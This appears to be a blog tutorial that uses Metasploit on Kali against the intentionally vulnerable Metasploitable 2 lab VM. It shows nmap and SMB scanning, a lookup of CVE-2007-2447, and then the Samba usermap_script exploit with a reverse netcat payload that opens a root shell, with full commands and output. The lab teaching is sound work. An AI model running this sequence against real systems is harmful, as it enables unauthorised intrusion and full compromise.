---
layout: post
title: "Metasploit Basics"
description: "Form the first start to a reverse shell on a vulnerable host"
#image: /assets/img/.png
#date-modified: 2020-mm-dd
excerpt_separator: <!--more-->
categories: [ "Security" ]
tags: [ "Metasploit", "Kali", "Metasploitable" ]
---

This guide show a basic way to use Metasploit (from the Kali Linux distribution). As a result, a reverse shell on a vulnerable host will be open.

This is *not* a guide for `Metasploitable 2`.

## Requirements

To follow this guide exactly:

- a VMware virtual machine with Kali Linux and Metasploit installed. See [Kali Linux on VMware Workstation]({% post_url 2022-11-19-Kali_VMware %}) if you need assistance.
- [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2) virtual machine. I've downloaded [Metasploitable 2 from SourceForge](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/) site.

## Getting started

Prepare the `Metasploitable 2` guest:

- Load `Metasploitable 2` virtual machine in VMware and remove the network adapter that is **not** connected to the `Host-only` network.
- Start `Metasploitable 2` and login with `msfadmin:msfadmin` credential
- Execute `ip a` and note the IPv4 address of `eth0`, in my case was `172.16.115.129`

In Kali open a terminal, execute `ip a` and note the IPv4 address of `eth0`, in my case was `172.16.115.130`, then and start `msfconsole`.

**Note:** Most of the commands in `msfconsole` will display their help if called with `-h` flag.

```sh
# create a new workspace
msf6 > workspace -a metasploitable
[*] Added workspace: metasploitable
[*] Workspace: metasploitable

# db_nmap uses nmap then stores the results in the workspace's database
# without port specification it will scan the most common 1000 TCP ports
# using the flag `-sV` will also query the open ports to try to identify the services
msf6 > db_nmap -n -sV 172.16.115.129
[*] Nmap: Starting Nmap ...
[...]

# is only one host now but using the `host` command you can see all the hosts in this workspace
msf6 > hosts
Hosts
=====
address         mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---  ----  -------  ---------  -----  -------  ----  --------
172.16.115.129             Linux                      server

# the `services` command shows the services in this workspace
msf6 > services
Services
========
host            port   proto  name         state  info
----            ----   -----  ----         -----  ----
172.16.115.129  21     tcp    ftp          open   vsftpd 2.3.4
172.16.115.129  22     tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
172.16.115.129  23     tcp    telnet       open   Linux telnetd
172.16.115.129  25     tcp    smtp         open   Postfix smtpd
172.16.115.129  53     tcp    domain       open   ISC BIND 9.4.2
172.16.115.129  80     tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2
172.16.115.129  111    tcp    rpcbind      open   2 RPC #100000
172.16.115.129  139    tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
172.16.115.129  445    tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
172.16.115.129  512    tcp    exec         open   netkit-rsh rexecd
172.16.115.129  513    tcp    login        open   OpenBSD or Solaris rlogind
172.16.115.129  514    tcp    shell        open   Netkit rshd
[...]

# using a dedicated module we may get better information about Samba's version
msf6 > use auxiliary/scanner/smb/smb_version
# set the RHOSTS option with the address of the Metaspoitable vm
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 172.16.115.129 
RHOSTS => 172.16.115.129
# start the module
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 172.16.115.129:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 172.16.115.129:445    -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 172.16.115.129:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

# the new version was stored in workspace's database
msf6 auxiliary(scanner/smb/smb_version) > services
Services
========
host            port   proto  name         state  info
----            ----   -----  ----         -----  ----
[...]
172.16.115.129  445    tcp    smb          open   Unix (Samba 3.0.20-Debian)
[...]
```

## Find an exploit

**Method  1** Is faster to use `search Samba` because the list of available
exploits is way shorter that the list of vulnerabilities

**Method 2** Find the exploits with `searchsploit samba` :

```sh
$ searchsploit samba
[...]
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb
```

then search the exploit in Metasploit:

```sh
msf6 > search username map
Matching Modules
================
   #  Name                                        Disclosure Date  Rank       Check  Description
[...]
   3  exploit/multi/samba/usermap_script          2007-05-14       excellent  No     Samba "username map script" Command Execution
```

**Method 3** Scan the host with GVM (OpenVAS) or another vulnerability scanner then, if a vulnerability
is found search it in Metasploit:

```sh
msf6 auxiliary(scanner/smb/smb_version) > search CVE-2007-2447
Matching Modules
================
   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
```

**Method 4** Search for Samba in a CVE list:

- [NIST - Search Vulnerability Database](https://nvd.nist.gov/vuln/search)
- [MITRE - Search CVE List](https://cve.mitre.org/cve/search_cve_list.html)
- etc.

I have used "Samba code" as a search term and found that CVE-2007-2447 allows remote attackers to execute arbitrary code in Samba version 3.0.20.

## Exploit

```sh
# select the exploit
msf6 auxiliary(scanner/smb/smb_version) > use exploit/multi/samba/usermap_script
[*] Using configured payload cmd/unix/reverse_netcat

# View the full module information with the info, or info -d command

# Check module's options
msf6 exploit(multi/samba/usermap_script) > show options
Module options (exploit/multi/samba/usermap_script):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic

# set the RHOSTS option with the address of the Metaspoitable vm
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 172.16.115.129 
RHOSTS => 172.16.115.129

# because the payload uses a reverse connection LHOST must be the address
# of the this vm
msf6 exploit(multi/samba/usermap_script) > set LHOST 172.16.115.130 
LHOST => 172.16.115.130

# start
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 172.16.115.130:4444 
[*] Command shell session 1 opened (172.16.115.130:4444 -> 172.16.115.129:53175) at 2022-11-19 11:12:13

# try some commands on the remote host
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
id
uid=0(root) gid=0(root)
exit
[*] 172.16.115.129 - Command shell session 1 closed.

# bye
msf6 exploit(multi/samba/usermap_script) > exit
```
